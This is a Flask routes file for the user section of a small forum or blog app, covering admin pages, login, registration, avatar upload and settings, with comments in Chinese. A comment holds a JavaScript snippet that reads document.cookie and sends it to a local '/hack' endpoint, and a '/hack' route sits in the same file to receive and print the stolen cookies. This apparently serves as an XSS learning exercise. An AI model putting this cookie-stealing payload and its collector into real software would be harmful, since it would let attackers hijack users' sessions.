from utils import log
from config import  gg, image_file_dir
from routes import (
    current_user,
    login_required,
)

from flask import (
    request,
    Blueprint,
    render_template,
    redirect,
    url_for,
    session,
    make_response,
    send_from_directory,
    abort,
    flash,
)
from models.user import User
from models.board import Board
from models.mail import Mail


main = Blueprint('user', __name__)


@main.route('/', methods=['GET'])
def index():
    return render_template('blog/blog_index.html')


@main.route('/admin', methods=['GET'])
@login_required
def admin():
    """
    只有用户id为1的用户有权限
    :return: 返回所有用户的信息
    """
    user = current_user()
    User.check_admin()
    print('from admin  before', gg.csrf_tokens)
    gg.reset_value(user.id)
    print('from admin  after', gg.csrf_tokens)
    return render_template('user/admin.html', token=gg.token[user.id], mails=Mail.find_all(), user=user, users=User.find_all(), boards=Board.find_all())


@main.route('/admin/edit/<int:user_id>', methods=['GET'])
@login_required
def admin_edit(user_id):
    """
    只有用户id为1的用户有权限，输入需要修改的id和password
    :return: 返回修改过的所有用户的信息
    """
    user = current_user()
    if User.check_token():
        User.check_admin()
        u = User.find(user_id)
        return render_template('user/admin_edit.html', token=gg.token[user.id], user=user, u=u)


@main.route('/admin/update', methods=['POST'])
@login_required
def admin_update():
    """
    只有用户id为1的用户有权限，输入需要修改的id和password
    :return: 返回修改过的所有用户的信息
    """
    if User.check_token():
        User.check_admin()
        form = request.form
        User.update(form)
        return redirect(url_for('.admin'))


# 增加一个register的路由函数
@main.route('/admin/register', methods=['POST'])
def admin_register():
    """
    允许GET是因为在地址栏输入地址转到register页面需要
    POST是因为在register页面输入账号密码点击register按钮需要
    主要的bug是转到register页面和register页面都都是同一个路由函数
    :return: 返回register页面，并显示所有用户信息
    """
    if User.check_token():
        User.check_admin()
        form = request.form
        if User.validate_register(form):
            return redirect(url_for('.admin'))


@main.route('/admin/delete/<int:user_id>')
@login_required
def user_delete(user_id):
    if User.check_token():
        User.check_admin()
        User.remove(user_id)
        return redirect(url_for('.admin'))


# 所有用户上传头像,先存在本地得到路径之后上传至七牛云，并删除本地图片
@main.route('/add_image', methods=['POST'])
@login_required
def add_img():
    user = current_user()
    if User.check_token():
        file = request.files['avatar']
        user.save_and_up(file)
        return redirect(url_for('.user_setting', id=user.id, token=gg.token[user.id]))


# web后端上传头像，后续可以改成Nginx+图床
# 本地只有default.png一张图片
@main.route('/uploads/<filename>')
@login_required
def uploads(filename):
    return send_from_directory(image_file_dir, filename)


# 在知乎console输入
# var c = document.cookie
# var img = `<img src='http://localhost:4000/hack?cookie=${c}'>`
# document.body.innerHTML += img
@main.route('/hack')
def hack():
    # xss 攻击的后台
    cookie = request.args.get('cookie')
    print('cookie', cookie)


# 增加一个可以看到任意user的路由函数
# 不需要check token，CRUD中除了查不需要验证token，但是需要传递token
# 需要传递   u: 我想要看的用户    和    user: current_user()
@main.route('/user/<int:id>')
# @login_required
def user_detail(id):
    user = current_user()
    u = User.find(id)
    if u is None:
        abort(404)
    if user is not None:
        # 保证每次调用index函数时清空gg,保证每次调用index函数时都有新的token可用
        print('from profile  before', gg.csrf_tokens)
        gg.reset_value(user.id)
        print('from profile  after', gg.csrf_tokens)
        return render_template('user/profile.html', u=u, token=gg.token[user.id], user=user)
    return render_template('user/profile.html', u=u, user=user)


# update方法需要重新写，统一到model父类中
# 增加一个在setting页面update的路由函数
@main.route('/user/update', methods=['POST'])
@login_required
def user_update():
    user = current_user()
    if User.check_token():
        form = request.form
        user.password_update(form)
        return redirect(url_for('user.user_setting', id=user.id, token=gg.token[user.id]))


# 增加一个去setting页面的路由函数
@main.route('/setting')
@login_required
def user_setting():
    user = current_user()
    if user is not None:
        # 保证每次调用index函数时清空gg,保证每次调用index函数时都有新的token可用
        print('from setting  before', gg.csrf_tokens)
        gg.reset_value(user.id)
        print('from setting  after', gg.csrf_tokens)
        return render_template('user/setting.html', user=user, token=gg.token[user.id], bid=-1)


# GET 去 登陆 页面， POST 提交表单
@main.route('/login', methods=['GET', 'POST'])
def user_login():
    form = request.form
    log('from route_login --> cookies: ', request.cookies)
    # ImmutableMultiDict([])是什么鬼？
    if form.get('username', None):
        if User.validate_login(form):
            u = User.find_by(username=form.get('username'))
            print('from signin  before', session)
            session['user_id'] = u.id
            print('from signin  after', session)
            return redirect(url_for('tweet.index'))
        else:
            flash('账号密码输入错误，请核对后再输入')
            return redirect(url_for('.user_login'))
    else:
        return render_template('user/login.html')


# GET 去  注册 页面， POST 提交表单
@main.route('/register', methods=['GET', 'POST'])
def user_register():
    """
    允许GET是因为在地址栏输入地址转到register页面需要
    POST是因为在register页面输入账号密码点击register按钮需要
    主要的bug是转到register页面和register页面都都是同一个路由函数
    :return: 返回register页面，并显示所有用户信息
    """
    form = request.form
    if form.get('username', None):
        if User.validate_register(form):
            return redirect(url_for('user.user_login'))
        else:
            flash('用户名和密码长度必须大于2，请核对后再输入')
            return redirect(url_for('.user_register'))
    else:
        return render_template('user/register.html')


@main.route('/signout')
def user_signout():
    """
    在session中删除当前登录的user_id
    :return: 返回login页面
    """
    if User.check_token():
        print('from signout  before', session)
        session.pop('user_id')
        print('from signout  after', session)
        return redirect(url_for('tweet.index'))
